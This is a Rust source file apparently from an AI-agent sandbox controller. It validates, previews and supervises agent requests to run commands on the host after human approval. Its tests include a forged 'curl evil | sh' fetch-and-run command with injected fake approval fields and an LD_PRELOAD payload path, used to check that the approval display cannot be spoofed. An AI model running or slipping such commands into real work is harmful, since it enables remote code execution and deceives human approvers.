//! Host commands (`goblin host run`): an approved `host-command` permission
//! request runs one command on the host, outside the sandbox, under the
//! helper's `--host-job` supervisor. The request ID is also the job ID. The
//! supervisor writes the job's output and outcome to the session's host-jobs
//! directory, which the sandbox sees read-only at /run/goblins/host-jobs, and
//! stops the job and everything it started when its lifetime pipe closes.
use super::Controller;
use super::Fault;
use super::conflict;
use super::missing;
use super::params;
use goblins_jsonrpc as rpc;
use goblins_protocol::rpc::HostCommand;
use goblins_runtime::Command;
use goblins_runtime::HostOutcome;
use serde::Deserialize;
use serde_json::{Value, json};
use std::path::PathBuf;

/// Host commands per sandbox, pending or running.
const JOBS: usize = 4;
/// The largest preview a request may need: everything in it is shown whole
/// for approval, so a bigger request is refused rather than cut.
const PREVIEW_LIMIT: usize = 64 * 1024;
/// Snapshot bytes that records nothing can evict (pending and running
/// requests, sessions) may fill, leaving room for new sessions below the
/// 900 KiB snapshot target and the 1 MiB frame limit.
const PINNED_LIMIT: usize = 640 * 1024;
/// A subject is a label; the preview holds the whole command.
const SUBJECT_LIMIT: usize = 200;

/// A validated request, held with the pending approval. The runtime holds
/// the pinned host directory it starts in.
pub(super) struct Spec {
    argv: Vec<String>,
    cwd_path: String,
    env: Vec<(String, String)>,
    timeout: Option<u64>,
    pub(super) detach: bool,
}
impl Spec {
    /// A one-line label for lists and notices, cut to SUBJECT_LIMIT; the
    /// preview shows the whole command.
    pub(super) fn subject(&self) -> String {
        let subject = format!("{} (in {})", quote(&self.argv), quote_word(&self.cwd_path));
        match subject.char_indices().nth(SUBJECT_LIMIT) {
            Some((end, _)) => format!("{}…", &subject[..end]),
            None => subject,
        }
    }
    /// Everything the host approves, each value escaped so that no request
    /// text can add a line or a field: the only newlines are the layout's.
    pub(super) fn preview(&self) -> Value {
        let command = quote(&self.argv);
        let directory = quote_word(&self.cwd_path);
        let environment: Vec<_> = self
            .env
            .iter()
            .map(|(k, v)| format!("{k}={}", quote_word(v)))
            .collect();
        let time_limit = match self.timeout {
            Some(t) => format!("{t} s"),
            None => "none".into(),
        };
        let mut lines = vec![
            "Runs on the host as you, outside the sandbox, with your files, services \
             and credentials. Scripts, build files and tests it reads are whatever the \
             goblin writes, also after this request."
                .to_string(),
            format!("Command: {command}"),
            format!("Directory: {directory}"),
        ];
        // One line each, so no value can hide another behind it.
        lines.extend(environment.iter().map(|e| format!("Environment: {e}")));
        lines.push(format!("Time limit: {time_limit}"));
        json!({"kind":"host-command","description":lines.join("\n"),
            "command":command,"directory":directory,"environment":environment,
            "time_limit":time_limit})
    }
}

/// Characters a display must not show as themselves: controls (line breaks
/// above all), and invisible or reordering marks that make text read other
/// than it is.
fn hidden(c: char) -> bool {
    c.is_control()
        || matches!(c, '\u{061C}' | '\u{200B}'..='\u{200F}' | '\u{2028}'..='\u{202E}'
            | '\u{2060}'..='\u{2069}' | '\u{FEFF}')
}

/// Shell-style quoting for display only; nothing is run through a shell.
/// Words with hidden characters use $'...' with escapes, so the display is
/// one line and reads as what runs.
fn quote_word(word: &str) -> String {
    if !word.is_empty()
        && word
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b"-_./=:,+@%".contains(&b))
    {
        word.to_string()
    } else if !word.chars().any(hidden) {
        format!("'{}'", word.replace('\'', "'\\''"))
    } else {
        let mut quoted = String::from("$'");
        for c in word.chars() {
            match c {
                '\\' => quoted.push_str("\\\\"),
                '\'' => quoted.push_str("\\'"),
                '\n' => quoted.push_str("\\n"),
                '\r' => quoted.push_str("\\r"),
                '\t' => quoted.push_str("\\t"),
                c if hidden(c) && (c as u32) < 0x10000 => {
                    quoted.push_str(&format!("\\u{:04X}", c as u32));
                }
                c if hidden(c) => quoted.push_str(&format!("\\U{:08X}", c as u32)),
                c => quoted.push(c),
            }
        }
        quoted.push('\'');
        quoted
    }
}
fn quote(words: &[String]) -> String {
    words
        .iter()
        .map(|w| quote_word(w))
        .collect::<Vec<_>>()
        .join(" ")
}

/// An approved job the goblin's runtime runs.
pub(super) struct Job {
    request: String,
    session: String,
    /// The attached request waiting for the outcome.
    connection: Option<u64>,
    notify: bool,
    /// Why the daemon stopped it, when it did.
    stopped: Option<String>,
}

/// A `host-command` request waiting for its runtime to pin the directory
/// it would start in. It holds the goblin's pending slot.
pub(super) struct Preparing {
    pub(super) request: String,
    pub(super) serial: u64,
    pub(super) connection: u64,
    pub(super) rpc: Value,
    pub(super) params: goblins_protocol::rpc::PermissionParams,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct JobId {
    request: String,
}

impl Controller {
    /// Check a `host-command` request from `session` before its runtime
    /// resolves the directory.
    pub(super) fn host_check(&self, session: &str) -> Result<(), Fault> {
        self.sessions.get(session).ok_or_else(missing)?;
        let active = self
            .host_jobs
            .iter()
            .filter(|j| j.session == session)
            .count();
        if active >= JOBS {
            return Err((-32003, format!("at most {JOBS} host commands run at once")));
        }
        Ok(())
    }

    /// Check a `host-command` request whose directory resolved to `cwd`
    /// before it is shown.
    pub(super) fn host_spec(&self, host: &HostCommand, cwd: PathBuf) -> Result<Spec, Fault> {
        let cwd_path = cwd
            .into_os_string()
            .into_string()
            .map_err(|_| (-32602, "the host directory's path is not UTF-8".to_string()))?;
        let spec = Spec {
            argv: host.argv.clone(),
            cwd_path,
            env: host.env.clone(),
            timeout: host.timeout,
            detach: host.detach,
        };
        // Approval views show the request whole, and the snapshot that carries
        // it to them has a size limit: refuse what would not fit, never cut it.
        let size = serde_json::to_vec(&spec.preview()).map_or(usize::MAX, |v| v.len())
            + SUBJECT_LIMIT * 4
            + 1024;
        if size > PREVIEW_LIMIT {
            return Err((
                -32602,
                "this host command is too long to show for approval; put it in a script in the shared directory".into(),
            ));
        }
        let mut pinned = self.snapshot();
        pinned
            .permissions
            .retain(|r| super::UNEVICTABLE.contains(&r.state.as_str()));
        if serde_json::to_vec(&pinned).map_or(usize::MAX, |v| v.len()) + size > PINNED_LIMIT {
            return Err((
                -32003,
                "too many large requests are waiting for the host; try again once they are decided"
                    .into(),
            ));
        }
        Ok(spec)
    }

    /// A host-job event from goblin `session`'s runtime.
    pub(super) fn host_event(&mut self, session: &str, event: super::Event) {
        use super::Event;
        match event {
            Event::HostJobPrepared { request, result } => {
                let Some(preparing) = self
                    .sessions
                    .get_mut(session)
                    .and_then(|a| a.preparing.take_if(|p| p.request == request))
                else {
                    // Withdrawn or stopped meanwhile; nothing is pinned.
                    self.send_host(session, Command::CancelHostJob { request });
                    return;
                };
                self.prepared(session, preparing, result);
            }
            Event::HostJobFailed { request, error } => {
                let Some(index) = self.host_jobs.iter().position(|j| j.request == request) else {
                    return;
                };
                let job = self.host_jobs.remove(index);
                let message = format!("could not start the host command: {error}");
                if let Some(r) = self.permission_mut(&request) {
                    r.state = "failed".into();
                    r.message = Some(message.clone());
                }
                self.reply_permission(&request, "failed", Some(message.clone()));
                self.operation_finished(&request, job.notify, Some(message));
                self.dirty = true;
            }
            Event::HostJobFinished { request, outcome } => {
                if let Some(index) = self.host_jobs.iter().position(|j| j.request == request) {
                    let job = self.host_jobs.remove(index);
                    self.finish_host_job(job, outcome);
                }
            }
            _ => (),
        }
    }

    /// Send `command` to goblin `session`'s runtime, if it has one.
    fn send_host(&mut self, session: &str, command: Command) {
        if let Some(runtime) = self
            .sessions
            .get_mut(session)
            .and_then(|a| a.runtime.as_mut())
        {
            let _ = runtime.send(command);
        }
    }

    /// The directory of a parked `host-command` request resolved: finish
    /// its checks and show it, or answer why not.
    fn prepared(&mut self, session: &str, p: Preparing, result: Result<PathBuf, String>) {
        let Some(index) = self.connections.iter().position(|c| c.id == p.connection) else {
            self.send_host(session, Command::CancelHostJob { request: p.request });
            return;
        };
        let mut c = self.connections.remove(index);
        c.waiting = None;
        let request = p.request.clone();
        let pinned = result.is_ok();
        let outcome = (|| {
            // State first, as when the call arrived: a goblin that stopped
            // or a daemon shutting down meanwhile answers conflict.
            let a = self.sessions.get(session).ok_or_else(missing)?;
            if self.shutdown.is_some() || a.record.state != "running" || a.pending.is_some() {
                return Err(conflict());
            }
            let cwd = result.map_err(|e| (-32602, e))?;
            let command = p.params.host.as_ref().ok_or_else(conflict)?;
            let spec = self.host_spec(command, cwd)?;
            self.submit(
                &mut c,
                &p.rpc,
                session,
                p.params,
                Some(p.serial),
                Some(spec),
            )
        })();
        if pinned && outcome.is_err() {
            self.send_host(session, Command::CancelHostJob { request });
        }
        c.answer(p.rpc, outcome);
        self.connections.push(c);
    }

    /// A parked `host-command` request whose goblin stopped first; the
    /// caller took it with `Active::take_preparing`.
    pub(super) fn refuse_preparing(&mut self, p: Preparing) {
        if let Some(c) = self.connections.iter_mut().find(|c| c.id == p.connection) {
            c.waiting = None;
            c.answer(p.rpc, Err(conflict()));
        }
    }

    /// A parked `host-command` request's caller went away.
    pub(super) fn withdraw_preparing(&mut self, connection: u64) {
        let gone: Vec<_> = self
            .sessions
            .iter_mut()
            .filter_map(|(id, a)| {
                let p = a.preparing.take_if(|p| p.connection == connection)?;
                Some((id.clone(), p.request))
            })
            .collect();
        for (session, request) in gone {
            self.send_host(&session, Command::CancelHostJob { request });
        }
    }

    /// The host's decision on a pending host command; approval starts it.
    pub(super) fn decide_host(&mut self, p: super::Decision, actor: &str) -> Result<Value, Fault> {
        let a = self.sessions.get_mut(&p.session).ok_or_else(missing)?;
        let pending = a.pending.take().ok_or_else(conflict)?;
        let spec = pending.host.ok_or_else(conflict)?;
        if let Some(r) = self.permission_mut(&p.request) {
            r.approved = Some(p.approved);
            r.state = if p.approved { "running" } else { "denied" }.into();
        }
        self.operation(
            &p.request,
            actor,
            crate::operation::Change::Decided {
                approved: p.approved,
            },
        );
        if !p.approved {
            self.send_host(
                &p.session,
                Command::CancelHostJob {
                    request: p.request.clone(),
                },
            );
            self.reply_permission(&p.request, "denied", None);
            self.operation_finished(&p.request, pending.notify, None);
        } else {
            // The outcome arrives as HostJobFinished, or HostJobFailed.
            self.host_jobs.push(Job {
                request: p.request.clone(),
                session: p.session.clone(),
                connection: (!pending.detached).then_some(pending.connection),
                notify: pending.notify,
                stopped: None,
            });
            self.send_host(
                &p.session,
                Command::RunHostJob {
                    request: p.request.clone(),
                    argv: spec.argv,
                    env: spec.env,
                    timeout: spec.timeout,
                },
            );
        }
        self.dirty = true;
        Ok(json!({"accepted":true,"request":p.request,"approved":p.approved}))
    }

    fn finish_host_job(&mut self, job: Job, outcome: Result<HostOutcome, String>) {
        let (state, message, code) = match (&outcome, &job.stopped) {
            (Err(_), Some(why)) => ("cancelled", why.clone(), None),
            (Err(diagnostic), None) => (
                "failed",
                format!(
                    "the host command supervisor failed: {}",
                    super::bounded(diagnostic)
                ),
                None,
            ),
            (Ok(o), _) if o.spawn_error.is_some() => {
                let error = o.spawn_error.clone().unwrap();
                let code = match error.as_str() {
                    "not found" => 127,
                    "not executable" => 126,
                    _ => 125,
                };
                ("failed", format!("the command was {error}"), Some(code))
            }
            (Ok(o), stopped) => {
                let mut message = match (o.exit_code, o.signal) {
                    (Some(c), _) => format!("exit code {c}"),
                    (None, Some(s)) => format!("ended by signal {s}"),
                    (None, None) => "ended".into(),
                };
                if o.timed_out {
                    message = format!("timed out; {message}");
                } else if let Some(why) = stopped.as_ref().filter(|_| o.cancelled) {
                    message = format!("{why}; {message}");
                }
                if o.truncated {
                    message.push_str("; output truncated");
                }
                let code = o.exit_code.or(o.signal.map(|s| 128 + s));
                (
                    if o.cancelled { "cancelled" } else { "finished" },
                    message,
                    code,
                )
            }
        };
        let result = json!({"request":job.request,"status":state,"message":message,
            "exit_code":outcome.as_ref().ok().and_then(|o| o.exit_code),
            "signal":outcome.as_ref().ok().and_then(|o| o.signal),
            "code":code,
            "log":format!("/run/goblins/host-jobs/{}/output.log", job.request)});
        self.host_outcomes
            .insert(job.request.clone(), result.clone());
        if let Some(r) = self.permission_mut(&job.request) {
            r.state = state.into();
            r.message = Some(message.clone());
        }
        // The attached request waits under the request ID. When it is still
        // there, the agent gets the result from it and needs no notice too;
        // a client that went away (say, a tool timeout) leaves the notice.
        let mut delivered = false;
        for c in &mut self.connections {
            if let Some((waiting, rpc_id)) = &c.waiting
                && *waiting == job.request
                && !c.dead
            {
                c.queue(rpc::result(rpc_id.clone(), result.clone()));
                c.close = true;
                delivered = true;
            }
        }
        self.operation_finished(&job.request, job.notify && !delivered, Some(message));
        self.dirty = true;
    }

    /// Stop `request`'s job; its outcome follows when the supervisor exits.
    fn stop_host_job(&mut self, request: &str, why: &str) -> bool {
        let Some(job) = self.host_jobs.iter_mut().find(|j| j.request == request) else {
            return false;
        };
        job.stopped.get_or_insert_with(|| why.to_string());
        let session = job.session.clone();
        self.send_host(
            &session,
            Command::CancelHostJob {
                request: request.into(),
            },
        );
        true
    }

    /// The attached caller went away: it no longer wants its job.
    pub(super) fn host_withdraw(&mut self, connection: u64) {
        let requests: Vec<_> = self
            .host_jobs
            .iter()
            .filter(|j| j.connection == Some(connection))
            .map(|j| j.request.clone())
            .collect();
        for request in requests {
            self.stop_host_job(&request, "its request connection closed");
        }
    }

    /// The goblin stopped: so do its jobs. Nobody is left to notify.
    pub(super) fn end_host_jobs(&mut self, session: &str) {
        let mut requests = vec![];
        for job in self.host_jobs.iter_mut().filter(|j| j.session == session) {
            job.notify = false;
            job.stopped
                .get_or_insert_with(|| "the goblin stopped".into());
            requests.push(job.request.clone());
        }
        for request in requests {
            self.send_host(session, Command::CancelHostJob { request });
        }
    }

    /// `host.status`, `host.list` and `host.cancel` from `session`, or
    /// `host.cancel` from the host (`session` None).
    pub(super) fn host_control(
        &mut self,
        session: Option<&str>,
        method: &str,
        value: Value,
    ) -> Result<Value, Fault> {
        let view = |c: &Controller, r: &super::PermissionRecord| -> Value {
            let mut v = c.host_outcomes.get(&r.id).cloned().unwrap_or_else(|| {
                json!({"request":r.id,"status":r.state,"message":r.message,
                    "log":format!("/run/goblins/host-jobs/{}/output.log", r.id)})
            });
            v["status"] = json!(r.state);
            v["subject"] = json!(r.package);
            v["reason"] = json!(r.reason);
            v
        };
        let mine = |r: &super::PermissionRecord| {
            r.kind == "host-command" && session.is_none_or(|s| r.session == s)
        };
        match method {
            "host.list" => {
                let _: super::Empty = params(value)?;
                Ok(json!({"jobs":self.permissions.iter().filter(|r| mine(r))
                    .map(|r| view(self, r)).collect::<Vec<_>>()}))
            }
            "host.status" => {
                let p: JobId = params(value)?;
                let r = self
                    .permissions
                    .iter()
                    .find(|r| r.id == p.request && mine(r))
                    .ok_or((-32004, format!("no host command {}", p.request)))?;
                Ok(view(self, r))
            }
            "host.cancel" => {
                let p: JobId = params(value)?;
                let r = self
                    .permissions
                    .iter()
                    .find(|r| r.id == p.request && mine(r))
                    .ok_or((-32004, format!("no host command {}", p.request)))?;
                let (owner, state) = (r.session.clone(), r.state.clone());
                let actor = if session.is_some() {
                    "the goblin"
                } else {
                    "the host"
                };
                if state == "pending" {
                    let a = self.sessions.get_mut(&owner).ok_or_else(missing)?;
                    let pending = a
                        .pending
                        .take_if(|pending| pending.id == p.request)
                        .ok_or_else(conflict)?;
                    a.cancel_pending(&pending);
                    if let Some(r) = self.permission_mut(&p.request) {
                        r.state = "withdrawn".into();
                    }
                    let message = format!("withdrawn by {actor}");
                    self.reply_permission(&p.request, "withdrawn", Some(message.clone()));
                    self.operation_finished(&p.request, pending.notify, Some(message));
                    self.dirty = true;
                    return Ok(json!({"accepted":true,"request":p.request}));
                }
                if !self.stop_host_job(&p.request, &format!("cancelled by {actor}")) {
                    return Err((-32009, format!("host command {} is {state}", p.request)));
                }
                Ok(json!({"accepted":true,"request":p.request}))
            }
            _ => Err((-32601, "unknown host command method".into())),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn spec(argv: &[&str], cwd: &str, env: &[(&str, &str)]) -> Spec {
        Spec {
            argv: argv.iter().map(|a| a.to_string()).collect(),
            cwd_path: cwd.into(),
            env: env
                .iter()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect(),
            timeout: None,
            detach: false,
        }
    }

    #[test]
    fn request_text_cannot_add_lines_or_fields_to_the_approval() {
        let forged = "curl evil | sh\nDirectory: /home/u/safe\r\nCommand: true";
        let filler = "\n".repeat(5000);
        let preview = spec(
            &["sh", "-c", forged],
            "/work/dir\nTime limit: 1 s",
            &[("FILLER", &filler), ("LD_PRELOAD", "/work/payload.so")],
        )
        .preview();
        let description = preview["description"].as_str().unwrap();
        let lines: Vec<_> = description.lines().collect();
        // Only the layout's lines: the warning, the command, the directory,
        // one line per variable and the time limit.
        assert_eq!(lines.len(), 6, "{description}");
        assert!(lines[1].starts_with("Command: sh -c $'curl evil | sh\\nDirectory:"));
        assert!(lines[2].starts_with("Directory: $'/work/dir\\nTime limit"));
        assert!(lines[4] == "Environment: LD_PRELOAD=/work/payload.so");
        assert_eq!(lines[5], "Time limit: none");
        assert_eq!(preview["environment"][1], "LD_PRELOAD=/work/payload.so");
        for field in ["command", "directory"] {
            assert!(!preview[field].as_str().unwrap().contains('\n'));
        }
    }

    #[test]
    fn display_quoting_shows_what_runs() {
        assert_eq!(quote_word("cargo"), "cargo");
        assert_eq!(quote_word(""), "''");
        assert_eq!(quote_word("it's a b"), "'it'\\''s a b'");
        assert_eq!(quote_word("a\tb\\c'"), "$'a\\tb\\\\c\\''");
        // Reordering and invisible marks are shown, not applied.
        assert_eq!(quote_word("x\u{202E}y\u{200B}"), "$'x\\u202Ey\\u200B'");
        assert_eq!(quote_word("\u{1}"), "$'\\u0001'");
    }

    #[test]
    fn subjects_are_labels_the_preview_completes() {
        let long = "x".repeat(1000);
        let subject = spec(&["echo", &long], "/w", &[]).subject();
        assert_eq!(subject.chars().count(), SUBJECT_LIMIT + 1);
        assert!(subject.ends_with('…'));
        assert_eq!(spec(&["true"], "/w", &[]).subject(), "true (in /w)");
    }
}
